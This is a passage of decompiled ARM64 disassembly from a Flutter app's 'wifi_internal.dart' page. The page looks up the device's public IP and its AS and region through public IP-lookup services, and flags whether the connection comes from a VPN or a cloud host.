// lib: , url: package:darkverse/wifi_internal.dart

// class id: 1048830, size: 0x8
class :: {
}

// class id: 3612, size: 0x10, field offset: 0xc
//   const constructor, 
class WifiInternalPage extends StatefulWidget {

  _ createState(/* No info */) {
    // ** addr: 0x9eea44, size: 0x48
    // 0x9eea44: EnterFrame
    //     0x9eea44: stp             fp, lr, [SP, #-0x10]!
    //     0x9eea48: mov             fp, SP
    // 0x9eea4c: AllocStack(0x8)
    //     0x9eea4c: sub             SP, SP, #8
    // 0x9eea50: CheckStackOverflow
    //     0x9eea50: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x9eea54: cmp             SP, x16
    //     0x9eea58: b.ls            #0x9eea84
    // 0x9eea5c: r1 = <WifiInternalPage>
    //     0x9eea5c: add             x1, PP, #0x32, lsl #12  ; [pp+0x32718] TypeArguments: <WifiInternalPage>
    //     0x9eea60: ldr             x1, [x1, #0x718]
    // 0x9eea64: r0 = _WifiInternalPageState()
    //     0x9eea64: bl              #0x9eeb38  ; Allocate_WifiInternalPageStateStub -> _WifiInternalPageState (size=0x38)
    // 0x9eea68: mov             x1, x0
    // 0x9eea6c: stur            x0, [fp, #-8]
    // 0x9eea70: r0 = _WifiInternalPageState()
    //     0x9eea70: bl              #0x9eea8c  ; [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_WifiInternalPageState
    // 0x9eea74: ldur            x0, [fp, #-8]
    // 0x9eea78: LeaveFrame
    //     0x9eea78: mov             SP, fp
    //     0x9eea7c: ldp             fp, lr, [SP], #0x10
    // 0x9eea80: ret
    //     0x9eea80: ret             
    // 0x9eea84: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x9eea84: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x9eea88: b               #0x9eea5c
  }
}

// class id: 4042, size: 0x38, field offset: 0x14
class _WifiInternalPageState extends State<dynamic> {

  [closure] void <anonymous closure>(dynamic) {
    // ** addr: 0x82bd10, size: 0x24
    // 0x82bd10: r1 = true
    //     0x82bd10: add             x1, NULL, #0x20  ; true
    // 0x82bd14: ldr             x2, [SP]
    // 0x82bd18: ArrayLoad: r3 = r2[0]  ; List_4
    //     0x82bd18: ldur            w3, [x2, #0x17]
    // 0x82bd1c: DecompressPointer r3
    //     0x82bd1c: add             x3, x3, HEAP, lsl #32
    // 0x82bd20: LoadField: r2 = r3->field_f
    //     0x82bd20: ldur            w2, [x3, #0xf]
    // 0x82bd24: DecompressPointer r2
    //     0x82bd24: add             x2, x2, HEAP, lsl #32
    // 0x82bd28: StoreField: r2->field_23 = r1
    //     0x82bd28: stur            w1, [x2, #0x23]
    // 0x82bd2c: r0 = Null
    //     0x82bd2c: mov             x0, NULL
    // 0x82bd30: ret
    //     0x82bd30: ret             
  }
  _ _loadPublicInfo(/* No info */) async {
    // ** addr: 0x82bd34, size: 0x348
    // 0x82bd34: EnterFrame
    //     0x82bd34: stp             fp, lr, [SP, #-0x10]!
    //     0x82bd38: mov             fp, SP
    // 0x82bd3c: AllocStack(0xb8)
    //     0x82bd3c: sub             SP, SP, #0xb8
    // 0x82bd40: SetupParameters(_WifiInternalPageState this /* r1 => r1, fp-0x80 */)
    //     0x82bd40: stur            NULL, [fp, #-8]
    //     0x82bd44: stur            x1, [fp, #-0x80]
    // 0x82bd48: CheckStackOverflow
    //     0x82bd48: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x82bd4c: cmp             SP, x16
    //     0x82bd50: b.ls            #0x82c074
    // 0x82bd54: r1 = 4
    //     0x82bd54: mov             x1, #4
    // 0x82bd58: r0 = AllocateContext()
    //     0x82bd58: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x82bd5c: mov             x2, x0
    // 0x82bd60: ldur            x1, [fp, #-0x80]
    // 0x82bd64: stur            x2, [fp, #-0x88]
    // 0x82bd68: StoreField: r2->field_f = r1
    //     0x82bd68: stur            w1, [x2, #0xf]
    // 0x82bd6c: InitAsync() -> Future<void?>
    //     0x82bd6c: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x82bd70: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x82bd74: ldur            x2, [fp, #-0x88]
    // 0x82bd78: r1 = Function '<anonymous closure>':.
    //     0x82bd78: add             x1, PP, #0x37, lsl #12  ; [pp+0x37730] AnonymousClosure: (0x82bd10), in [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_loadPublicInfo (0x82bd34)
    //     0x82bd7c: ldr             x1, [x1, #0x730]
    // 0x82bd80: r0 = AllocateClosure()
    //     0x82bd80: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x82bd84: ldur            x1, [fp, #-0x80]
    // 0x82bd88: mov             x2, x0
    // 0x82bd8c: r0 = setState()
    //     0x82bd8c: bl              #0x457110  ; [package:flutter/src/widgets/framework.dart] State::setState
    // 0x82bd90: ldur            x2, [fp, #-0x88]
    // 0x82bd94: r1 = "https://api.ipify.org\?format=json"
    //     0x82bd94: add             x1, PP, #0x37, lsl #12  ; [pp+0x37738] "https://api.ipify.org\?format=json"
    //     0x82bd98: ldr             x1, [x1, #0x738]
    // 0x82bd9c: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x82bd9c: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x82bda0: r0 = parse()
    //     0x82bda0: bl              #0x4a4d3c  ; [dart:core] Uri::parse
    // 0x82bda4: mov             x1, x0
    // 0x82bda8: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x82bda8: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x82bdac: r0 = get()
    //     0x82bdac: bl              #0x6a13f8  ; [package:http/http.dart] ::get
    // 0x82bdb0: mov             x1, x0
    // 0x82bdb4: stur            x1, [fp, #-0x90]
    // 0x82bdb8: r0 = Await()
    //     0x82bdb8: bl              #0x4a3d90  ; AwaitStub
    // 0x82bdbc: mov             x1, x0
    // 0x82bdc0: stur            x0, [fp, #-0x90]
    // 0x82bdc4: r0 = body()
    //     0x82bdc4: bl              #0x4789e4  ; [package:http/src/response.dart] Response::body
    // 0x82bdc8: mov             x1, x0
    // 0x82bdcc: r0 = jsonDecode()
    //     0x82bdcc: bl              #0x4789a4  ; [dart:convert] ::jsonDecode
    // 0x82bdd0: stur            x0, [fp, #-0x98]
    // 0x82bdd4: r16 = "ip"
    //     0x82bdd4: add             x16, PP, #0x37, lsl #12  ; [pp+0x37740] "ip"
    //     0x82bdd8: ldr             x16, [x16, #0x740]
    // 0x82bddc: stp             x16, x0, [SP]
    // 0x82bde0: r4 = 0
    //     0x82bde0: mov             x4, #0
    // 0x82bde4: ldr             x0, [SP, #8]
    // 0x82bde8: r16 = 505515453348
    //     0x82bde8: add             x16, PP, #0x37, lsl #12  ; [pp+0x37748] IMM: 0x75b311aba4
    //     0x82bdec: add             x16, x16, #0x748
    // 0x82bdf0: ldp             lr, x5, [x16]
    // 0x82bdf4: blr             lr
    // 0x82bdf8: mov             x4, x0
    // 0x82bdfc: ldur            x3, [fp, #-0x88]
    // 0x82be00: stur            x4, [fp, #-0xa0]
    // 0x82be04: StoreField: r3->field_13 = r0
    //     0x82be04: stur            w0, [x3, #0x13]
    //     0x82be08: tbz             w0, #0, #0x82be24
    //     0x82be0c: ldurb           w16, [x3, #-1]
    //     0x82be10: ldurb           w17, [x0, #-1]
    //     0x82be14: and             x16, x17, x16, lsr #2
    //     0x82be18: tst             x16, HEAP, lsr #32
    //     0x82be1c: b.eq            #0x82be24
    //     0x82be20: bl              #0xbf6274  ; WriteBarrierWrappersStub
    // 0x82be24: r1 = Null
    //     0x82be24: mov             x1, NULL
    // 0x82be28: r2 = 6
    //     0x82be28: mov             x2, #6
    // 0x82be2c: r0 = AllocateArray()
    //     0x82be2c: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x82be30: r16 = "http://ip-api.com/json/"
    //     0x82be30: add             x16, PP, #0x37, lsl #12  ; [pp+0x37758] "http://ip-api.com/json/"
    //     0x82be34: ldr             x16, [x16, #0x758]
    // 0x82be38: StoreField: r0->field_f = r16
    //     0x82be38: stur            w16, [x0, #0xf]
    // 0x82be3c: ldur            x1, [fp, #-0xa0]
    // 0x82be40: StoreField: r0->field_13 = r1
    //     0x82be40: stur            w1, [x0, #0x13]
    // 0x82be44: r16 = "\?fields=as,regionName,status,query"
    //     0x82be44: add             x16, PP, #0x37, lsl #12  ; [pp+0x37760] "\?fields=as,regionName,status,query"
    //     0x82be48: ldr             x16, [x16, #0x760]
    // 0x82be4c: ArrayStore: r0[0] = r16  ; List_4
    //     0x82be4c: stur            w16, [x0, #0x17]
    // 0x82be50: str             x0, [SP]
    // 0x82be54: r0 = _interpolate()
    //     0x82be54: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x82be58: mov             x1, x0
    // 0x82be5c: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x82be5c: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x82be60: r0 = parse()
    //     0x82be60: bl              #0x4a4d3c  ; [dart:core] Uri::parse
    // 0x82be64: mov             x1, x0
    // 0x82be68: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x82be68: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x82be6c: r0 = get()
    //     0x82be6c: bl              #0x6a13f8  ; [package:http/http.dart] ::get
    // 0x82be70: mov             x1, x0
    // 0x82be74: stur            x1, [fp, #-0xa0]
    // 0x82be78: r0 = Await()
    //     0x82be78: bl              #0x4a3d90  ; AwaitStub
    // 0x82be7c: mov             x1, x0
    // 0x82be80: stur            x0, [fp, #-0xa0]
    // 0x82be84: r0 = body()
    //     0x82be84: bl              #0x4789e4  ; [package:http/src/response.dart] Response::body
    // 0x82be88: mov             x1, x0
    // 0x82be8c: r0 = jsonDecode()
    //     0x82be8c: bl              #0x4789a4  ; [dart:convert] ::jsonDecode
    // 0x82be90: mov             x1, x0
    // 0x82be94: ldur            x2, [fp, #-0x88]
    // 0x82be98: ArrayStore: r2[0] = r0  ; List_4
    //     0x82be98: stur            w0, [x2, #0x17]
    //     0x82be9c: tbz             w0, #0, #0x82beb8
    //     0x82bea0: ldurb           w16, [x2, #-1]
    //     0x82bea4: ldurb           w17, [x0, #-1]
    //     0x82bea8: and             x16, x17, x16, lsr #2
    //     0x82beac: tst             x16, HEAP, lsr #32
    //     0x82beb0: b.eq            #0x82beb8
    //     0x82beb4: bl              #0xbf6254  ; WriteBarrierWrappersStub
    // 0x82beb8: r16 = "as"
    //     0x82beb8: add             x16, PP, #0x37, lsl #12  ; [pp+0x37768] "as"
    //     0x82bebc: ldr             x16, [x16, #0x768]
    // 0x82bec0: stp             x16, x1, [SP]
    // 0x82bec4: r4 = 0
    //     0x82bec4: mov             x4, #0
    // 0x82bec8: ldr             x0, [SP, #8]
    // 0x82becc: r16 = 505515453348
    //     0x82becc: add             x16, PP, #0x37, lsl #12  ; [pp+0x37770] IMM: 0x75b311aba4
    //     0x82bed0: add             x16, x16, #0x770
    // 0x82bed4: ldp             lr, x5, [x16]
    // 0x82bed8: blr             lr
    // 0x82bedc: mov             x3, x0
    // 0x82bee0: r2 = Null
    //     0x82bee0: mov             x2, NULL
    // 0x82bee4: r1 = Null
    //     0x82bee4: mov             x1, NULL
    // 0x82bee8: stur            x3, [fp, #-0xa8]
    // 0x82beec: r4 = 60
    //     0x82beec: mov             x4, #0x3c
    // 0x82bef0: branchIfSmi(r0, 0x82befc)
    //     0x82bef0: tbz             w0, #0, #0x82befc
    // 0x82bef4: r4 = LoadClassIdInstr(r0)
    //     0x82bef4: ldur            x4, [x0, #-1]
    //     0x82bef8: ubfx            x4, x4, #0xc, #0x14
    // 0x82befc: sub             x4, x4, #0x5e
    // 0x82bf00: cmp             x4, #1
    // 0x82bf04: b.ls            #0x82bf18
    // 0x82bf08: r8 = String
    //     0x82bf08: ldr             x8, [PP, #0x238]  ; [pp+0x238] Type: String
    // 0x82bf0c: r3 = Null
    //     0x82bf0c: add             x3, PP, #0x37, lsl #12  ; [pp+0x37780] Null
    //     0x82bf10: ldr             x3, [x3, #0x780]
    // 0x82bf14: r0 = String()
    //     0x82bf14: bl              #0xbfe1d8  ; IsType_String_Stub
    // 0x82bf18: ldur            x0, [fp, #-0xa8]
    // 0x82bf1c: r1 = LoadClassIdInstr(r0)
    //     0x82bf1c: ldur            x1, [x0, #-1]
    //     0x82bf20: ubfx            x1, x1, #0xc, #0x14
    // 0x82bf24: str             x0, [SP]
    // 0x82bf28: mov             x0, x1
    // 0x82bf2c: r0 = GDT[cid_x0 + -0xffc]()
    //     0x82bf2c: sub             lr, x0, #0xffc
    //     0x82bf30: ldr             lr, [x21, lr, lsl #3]
    //     0x82bf34: blr             lr
    // 0x82bf38: mov             x3, x0
    // 0x82bf3c: stur            x3, [fp, #-0xa8]
    // 0x82bf40: r0 = LoadClassIdInstr(r3)
    //     0x82bf40: ldur            x0, [x3, #-1]
    //     0x82bf44: ubfx            x0, x0, #0xc, #0x14
    // 0x82bf48: mov             x1, x3
    // 0x82bf4c: r2 = "vpn"
    //     0x82bf4c: add             x2, PP, #0x37, lsl #12  ; [pp+0x37790] "vpn"
    //     0x82bf50: ldr             x2, [x2, #0x790]
    // 0x82bf54: r4 = const [0, 0x2, 0, 0x2, null]
    //     0x82bf54: ldr             x4, [PP, #0x408]  ; [pp+0x408] List(5) [0, 0x2, 0, 0x2, Null]
    // 0x82bf58: r0 = GDT[cid_x0 + -0x1000]()
    //     0x82bf58: sub             lr, x0, #1, lsl #12
    //     0x82bf5c: ldr             lr, [x21, lr, lsl #3]
    //     0x82bf60: blr             lr
    // 0x82bf64: tbz             w0, #4, #0x82bfec
    // 0x82bf68: ldur            x3, [fp, #-0xa8]
    // 0x82bf6c: r0 = LoadClassIdInstr(r3)
    //     0x82bf6c: ldur            x0, [x3, #-1]
    //     0x82bf70: ubfx            x0, x0, #0xc, #0x14
    // 0x82bf74: mov             x1, x3
    // 0x82bf78: r2 = "cloud"
    //     0x82bf78: add             x2, PP, #0x37, lsl #12  ; [pp+0x37798] "cloud"
    //     0x82bf7c: ldr             x2, [x2, #0x798]
    // 0x82bf80: r4 = const [0, 0x2, 0, 0x2, null]
    //     0x82bf80: ldr             x4, [PP, #0x408]  ; [pp+0x408] List(5) [0, 0x2, 0, 0x2, Null]
    // 0x82bf84: r0 = GDT[cid_x0 + -0x1000]()
    //     0x82bf84: sub             lr, x0, #1, lsl #12
    //     0x82bf88: ldr             lr, [x21, lr, lsl #3]
    //     0x82bf8c: blr             lr
    // 0x82bf90: tbz             w0, #4, #0x82bfec
    // 0x82bf94: ldur            x3, [fp, #-0xa8]
    // 0x82bf98: r0 = LoadClassIdInstr(r3)
    //     0x82bf98: ldur            x0, [x3, #-1]
    //     0x82bf9c: ubfx            x0, x0, #0xc, #0x14
    // 0x82bfa0: mov             x1, x3
    // 0x82bfa4: r2 = "digitalocean"
    //     0x82bfa4: add             x2, PP, #0x37, lsl #12  ; [pp+0x377a0] "digitalocean"
    //     0x82bfa8: ldr             x2, [x2, #0x7a0]
    // 0x82bfac: r4 = const [0, 0x2, 0, 0x2, null]
    //     0x82bfac: ldr             x4, [PP, #0x408]  ; [pp+0x408] List(5) [0, 0x2, 0, 0x2, Null]
    // 0x82bfb0: r0 = GDT[cid_x0 + -0x1000]()
    //     0x82bfb0: sub             lr, x0, #1, lsl #12
    //     0x82bfb4: ldr             lr, [x21, lr, lsl #3]
    //     0x82bfb8: blr             lr
    // 0x82bfbc: tbz             w0, #4, #0x82bfec
    // 0x82bfc0: ldur            x3, [fp, #-0xa8]
    // 0x82bfc4: r0 = LoadClassIdInstr(r3)
    //     0x82bfc4: ldur            x0, [x3, #-1]
    //     0x82bfc8: ubfx            x0, x0, #0xc, #0x14
    // 0x82bfcc: mov             x1, x3
    // 0x82bfd0: r2 = "aws"
    //     0x82bfd0: add             x2, PP, #0x37, lsl #12  ; [pp+0x377a8] "aws"
    //     0x82bfd4: ldr             x2, [x2, #0x7a8]
    // 0x82bfd8: r4 = const [0, 0x2, 0, 0x2, null]
    //     0x82bfd8: ldr             x4, [PP, #0x408]  ; [pp+0x408] List(5) [0, 0x2, 0, 0x2, Null]
    // 0x82bfdc: r0 = GDT[cid_x0 + -0x1000]()
    //     0x82bfdc: sub             lr, x0, #1, lsl #12
    //     0x82bfe0: ldr             lr, [x21, lr, lsl #3]
    //     0x82bfe4: blr             lr
    // 0x82bfe8: tbnz            w0, #4, #0x82bff4
    // 0x82bfec: r3 = true
    //     0x82bfec: add             x3, NULL, #0x20  ; true
    // 0x82bff0: b               #0x82c020
    // 0x82bff4: ldur            x3, [fp, #-0xa8]
    // 0x82bff8: r0 = LoadClassIdInstr(r3)
    //     0x82bff8: ldur            x0, [x3, #-1]
    //     0x82bffc: ubfx            x0, x0, #0xc, #0x14
    // 0x82c000: mov             x1, x3
    // 0x82c004: r2 = "google"
    //     0x82c004: add             x2, PP, #0x37, lsl #12  ; [pp+0x377b0] "google"
    //     0x82c008: ldr             x2, [x2, #0x7b0]
    // 0x82c00c: r4 = const [0, 0x2, 0, 0x2, null]
    //     0x82c00c: ldr             x4, [PP, #0x408]  ; [pp+0x408] List(5) [0, 0x2, 0, 0x2, Null]
    // 0x82c010: r0 = GDT[cid_x0 + -0x1000]()
    //     0x82c010: sub             lr, x0, #1, lsl #12
    //     0x82c014: ldr             lr, [x21, lr, lsl #3]
    //     0x82c018: blr             lr
    // 0x82c01c: mov             x3, x0
    // 0x82c020: ldur            x0, [fp, #-0x88]
    // 0x82c024: stur            x3, [fp, #-0x90]
    // 0x82c028: StoreField: r0->field_1b = r3
    //     0x82c028: stur            w3, [x0, #0x1b]
    // 0x82c02c: mov             x2, x0
    // 0x82c030: r1 = Function '<anonymous closure>':.
    //     0x82c030: add             x1, PP, #0x37, lsl #12  ; [pp+0x377b8] AnonymousClosure: (0x82c0b4), in [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_loadPublicInfo (0x82bd34)
    //     0x82c034: ldr             x1, [x1, #0x7b8]
    // 0x82c038: r0 = AllocateClosure()
    //     0x82c038: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x82c03c: ldur            x1, [fp, #-0x80]
    // 0x82c040: mov             x2, x0
    // 0x82c044: r0 = setState()
    //     0x82c044: bl              #0x457110  ; [package:flutter/src/widgets/framework.dart] State::setState
    // 0x82c048: b               #0x82c06c
    // 0x82c04c: sub             SP, fp, #0xb8
    // 0x82c050: ldur            x2, [fp, #-0x88]
    // 0x82c054: r1 = Function '<anonymous closure>':.
    //     0x82c054: add             x1, PP, #0x37, lsl #12  ; [pp+0x377c0] AnonymousClosure: (0x82c07c), in [package:darkverse/wifi_internal.dart] _WifiInternalPageState::_loadPublicInfo (0x82bd34)
    //     0x82c058: ldr             x1, [x1, #0x7c0]
    // 0x82c05c: r0 = AllocateClosure()
    //     0x82c05c: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x82c060: ldur            x1, [fp, #-0x80]
    // 0x82c064: mov             x2, x0
    // 0x82c068: r0 = setState()
    //     0x82c068: bl              #0x457110  ; [package:flutter/src/widgets/framework.dart] State::setState
    // 0x82c06c: r0 = Null
    //     0x82c06c: mov             x0, NULL
    // 0x82c070: r0 = ReturnAsyncNotFuture()
    //     0x82c070: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x82c074: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x82c074: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x82c078: b               #0x82bd54
  }
  [closure] void <anonymous closure>(dynamic) {
    // ** addr: 0x82c07c, size: 0x38
    // 0x82c07c: r2 = "Error"
    //     0x82c07c: add             x2, PP, #0xf, lsl #12  ; [pp+0xfb20] "Error"
    //     0x82c080: ldr             x2, [x2, #0xb20]
    // 0x82c084: r1 = false
    //     0x82c084: add             x1, NULL, #0x30  ; false
    // 0x82c088: ldr             x3, [SP]
    // 0x82c08c: ArrayLoad: r4 = r3[0]  ; List_4
    //     0x82c08c: ldur            w4, [x3, #0x17]
    // 0x82c090: DecompressPointer r4
    //     0x82c090: add             x4, x4, HEAP, lsl #32
    // 0x82c094: LoadField: r3 = r4->field_f
    //     0x82c094: ldur            w3, [x4, #0xf]
    // 0x82c098: DecompressPointer r3
    //     0x82c098: add             x3, x3, HEAP, lsl #32
    // 0x82c09c: StoreField: r3->field_1b = r2
    //     0x82c09c: stur            w2, [x3, #0x1b]
    // 0x82c0a0: ArrayStore: r3[0] = r2  ; List_4
    //     0x82c0a0: stur            w2, [x3, #0x17]
    // 0x82c0a4: StoreField: r3->field_13 = r2
    //     0x82c0a4: stur            w2, [x3, #0x13]
    // 0x82c0a8: StoreField: r3->field_23 = r1
    //     0x82c0a8: stur            w1, [x3, #0x23]
    // 0x82c0ac: r0 = Null
    //     0x82c0ac: mov             x0, NULL
    // 0x82c0b0: ret
    //     0x82c0b0: ret             
  }
  [closure] void <anonymous closure>(dynamic) {
    // ** addr: 0x82c0b4, size: 0x238
    // 0x82c0b4: EnterFrame
    //     0x82c0b4: stp             fp, lr, [SP, #-0x10]!
    //     0x82c0b8: mov             fp, SP
    // 0x82c0bc: AllocStack(0x30)
    //     0x82c0bc: sub             SP, SP, #0x30
    // 0x82c0c0: SetupParameters([dynamic _ /* r0 */])
    //     0x82c0c0: ldr             x0, [fp, #0x10]
    //     0x82c0c4: ldur            w3, [x0, #0x17]
    //     0x82c0c8: add             x3, x3, HEAP, lsl #32
    //     0x82c0cc: stur            x3, [fp, #-0x18]
    // 0x82c0d0: CheckStackOverflow
    //     0x82c0d0: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x82c0d4: cmp             SP, x16
    //     0x82c0d8: b.ls            #0x82c2e4
    // 0x82c0dc: LoadField: r4 = r3->field_f
    //     0x82c0dc: ldur            w4, [x3, #0xf]
    // 0x82c0e0: DecompressPointer r4
    //     0x82c0e0: add             x4, x4, HEAP, lsl #32
    // 0x82c0e4: stur            x4, [fp, #-0x10]
    // 0x82c0e8: LoadField: r5 = r3->field_13
    //     0x82c0e8: ldur            w5, [x3, #0x13]
    // 0x82c0ec: DecompressPointer r5
    //     0x82c0ec: add             x5, x5, HEAP, lsl #32
    // 0x82c0f0: mov             x0, x5
    // 0x82c0f4: stur            x5, [fp, #-8]
    // 0x82c0f8: r2 = Null
    //     0x82c0f8: mov             x2, NULL
    // 0x82c0fc: r1 = Null
    //     0x82c0fc: mov             x1, NULL
    // 0x82c100: r4 = 60
    //     0x82c100: mov             x4, #0x3c
    // 0x82c104: branchIfSmi(r0, 0x82c110)
    //     0x82c104: tbz             w0, #0, #0x82c110
    // 0x82c108: r4 = LoadClassIdInstr(r0)
    //     0x82c108: ldur            x4, [x0, #-1]
    //     0x82c10c: ubfx            x4, x4, #0xc, #0x14
    // 0x82c110: sub             x4, x4, #0x5e
    // 0x82c114: cmp             x4, #1
    // 0x82c118: b.ls            #0x82c12c
    // 0x82c11c: r8 = String
    //     0x82c11c: ldr             x8, [PP, #0x238]  ; [pp+0x238] Type: String
    // 0x82c120: r3 = Null
    //     0x82c120: add             x3, PP, #0x37, lsl #12  ; [pp+0x377c8] Null
    //     0x82c124: ldr             x3, [x3, #0x7c8]
    // 0x82c128: r0 = String()
    //     0x82c128: bl              #0xbfe1d8  ; IsType_String_Stub
    // 0x82c12c: ldur            x0, [fp, #-8]
    // 0x82c130: ldur            x1, [fp, #-0x10]
    // 0x82c134: StoreField: r1->field_13 = r0
    //     0x82c134: stur            w0, [x1, #0x13]
    //     0x82c138: ldurb           w16, [x1, #-1]
    //     0x82c13c: ldurb           w17, [x0, #-1]
    //     0x82c140: and             x16, x17, x16, lsr #2
    //     0x82c144: tst             x16, HEAP, lsr #32
    //     0x82c148: b.eq            #0x82c150
    //     0x82c14c: bl              #0xbf6234  ; WriteBarrierWrappersStub
    // 0x82c150: ldur            x0, [fp, #-0x18]
    // 0x82c154: ArrayLoad: r2 = r0[0]  ; List_4
    //     0x82c154: ldur            w2, [x0, #0x17]
    // 0x82c158: DecompressPointer r2
    //     0x82c158: add             x2, x2, HEAP, lsl #32
    // 0x82c15c: stur            x2, [fp, #-8]
    // 0x82c160: r16 = "regionName"
    //     0x82c160: add             x16, PP, #0x37, lsl #12  ; [pp+0x377d8] "regionName"
    //     0x82c164: ldr             x16, [x16, #0x7d8]
    // 0x82c168: stp             x16, x2, [SP]
    // 0x82c16c: r4 = 0
    //     0x82c16c: mov             x4, #0
    // 0x82c170: ldr             x0, [SP, #8]
    // 0x82c174: r16 = 505515453348
    //     0x82c174: add             x16, PP, #0x37, lsl #12  ; [pp+0x377e0] IMM: 0x75b311aba4
    //     0x82c178: add             x16, x16, #0x7e0
    // 0x82c17c: ldp             lr, x5, [x16]
    // 0x82c180: blr             lr
    // 0x82c184: cmp             w0, NULL
    // 0x82c188: b.ne            #0x82c194
    // 0x82c18c: r5 = "-"
    //     0x82c18c: ldr             x5, [PP, #0x33d0]  ; [pp+0x33d0] "-"
    // 0x82c190: b               #0x82c198
    // 0x82c194: mov             x5, x0
    // 0x82c198: ldur            x4, [fp, #-0x18]
    // 0x82c19c: ldur            x3, [fp, #-0x10]
    // 0x82c1a0: mov             x0, x5
    // 0x82c1a4: stur            x5, [fp, #-0x20]
    // 0x82c1a8: r2 = Null
    //     0x82c1a8: mov             x2, NULL
    // 0x82c1ac: r1 = Null
    //     0x82c1ac: mov             x1, NULL
    // 0x82c1b0: r4 = 60
    //     0x82c1b0: mov             x4, #0x3c
    // 0x82c1b4: branchIfSmi(r0, 0x82c1c0)
    //     0x82c1b4: tbz             w0, #0, #0x82c1c0
    // 0x82c1b8: r4 = LoadClassIdInstr(r0)
    //     0x82c1b8: ldur            x4, [x0, #-1]
    //     0x82c1bc: ubfx            x4, x4, #0xc, #0x14
    // 0x82c1c0: sub             x4, x4, #0x5e
    // 0x82c1c4: cmp             x4, #1
    // 0x82c1c8: b.ls            #0x82c1dc
    // 0x82c1cc: r8 = String
    //     0x82c1cc: ldr             x8, [PP, #0x238]  ; [pp+0x238] Type: String
    // 0x82c1d0: r3 = Null
    //     0x82c1d0: add             x3, PP, #0x37, lsl #12  ; [pp+0x377f0] Null
    //     0x82c1d4: ldr             x3, [x3, #0x7f0]
    // 0x82c1d8: r0 = String()
    //     0x82c1d8: bl              #0xbfe1d8  ; IsType_String_Stub
    // 0x82c1dc: ldur            x0, [fp, #-0x20]
    // 0x82c1e0: ldur            x1, [fp, #-0x10]
    // 0x82c1e4: ArrayStore: r1[0] = r0  ; List_4
    //     0x82c1e4: stur            w0, [x1, #0x17]
    //     0x82c1e8: ldurb           w16, [x1, #-1]
    //     0x82c1ec: ldurb           w17, [x0, #-1]
    //     0x82c1f0: and             x16, x17, x16, lsr #2
    //     0x82c1f4: tst             x16, HEAP, lsr #32
    //     0x82c1f8: b.eq            #0x82c200
    //     0x82c1fc: bl              #0xbf6234  ; WriteBarrierWrappersStub
    // 0x82c200: ldur            x0, [fp, #-0x18]
    // 0x82c204: LoadField: r1 = r0->field_f
    //     0x82c204: ldur            w1, [x0, #0xf]
    // 0x82c208: DecompressPointer r1
    //     0x82c208: add             x1, x1, HEAP, lsl #32
    // 0x82c20c: stur            x1, [fp, #-0x10]
    // 0x82c210: ldur            x16, [fp, #-8]
    // 0x82c214: r30 = "as"
    //     0x82c214: add             lr, PP, #0x37, lsl #12  ; [pp+0x37768] "as"
    //     0x82c218: ldr             lr, [lr, #0x768]
    // 0x82c21c: stp             lr, x16, [SP]
    // 0x82c220: r4 = 0
    //     0x82c220: mov             x4, #0
    // 0x82c224: ldr             x0, [SP, #8]
    // 0x82c228: r16 = 505515453348
    //     0x82c228: add             x16, PP, #0x37, lsl #12  ; [pp+0x37800] IMM: 0x75b311aba4
    //     0x82c22c: add             x16, x16, #0x800
    // 0x82c230: ldp             lr, x5, [x16]
    // 0x82c234: blr             lr
    // 0x82c238: cmp             w0, NULL
    // 0x82c23c: b.ne            #0x82c248
    // 0x82c240: r5 = "-"
    //     0x82c240: ldr             x5, [PP, #0x33d0]  ; [pp+0x33d0] "-"
    // 0x82c244: b               #0x82c24c
    // 0x82c248: mov             x5, x0
    // 0x82c24c: ldur            x3, [fp, #-0x18]
    // 0x82c250: ldur            x4, [fp, #-0x10]
    // 0x82c254: mov             x0, x5
    // 0x82c258: stur            x5, [fp, #-8]
    // 0x82c25c: r2 = Null
    //     0x82c25c: mov             x2, NULL
    // 0x82c260: r1 = Null
    //     0x82c260: mov             x1, NULL
    // 0x82c264: r4 = 60
    //     0x82c264: mov             x4, #0x3c
    // 0x82c268: branchIfSmi(r0, 0x82c274)
    //     0x82c268: tbz             w0, #0, #0x82c274
    // 0x82c26c: r4 = LoadClassIdInstr(r0)
    //     0x82c26c: ldur            x4, [x0, #-1]
    //     0x82c270: ubfx            x4, x4, #0xc, #0x14
    // 0x82c274: sub             x4, x4, #0x5e
    // 0x82c278: cmp             x4, #1
    // 0x82c27c: b.ls            #0x82c290
    // 0x82c280: r8 = String
    //     0x82c280: ldr             x8, [PP, #0x238]  ; [pp+0x238] Type: String
    // 0x82c284: r3 = Null
    //     0x82c284: add             x3, PP, #0x37, lsl #12  ; [pp+0x37810] Null
    //     0x82c288: ldr             x3, [x3, #0x810]
    // 0x82c28c: r0 = String()
    //     0x82c28c: bl              #0xbfe1d8  ; IsType_String_Stub
    // 0x82c290: ldur            x0, [fp, #-8]
    // 0x82c294: ldur            x1, [fp, #-0x10]
    // 0x82c298: StoreField: r1->field_1b = r0
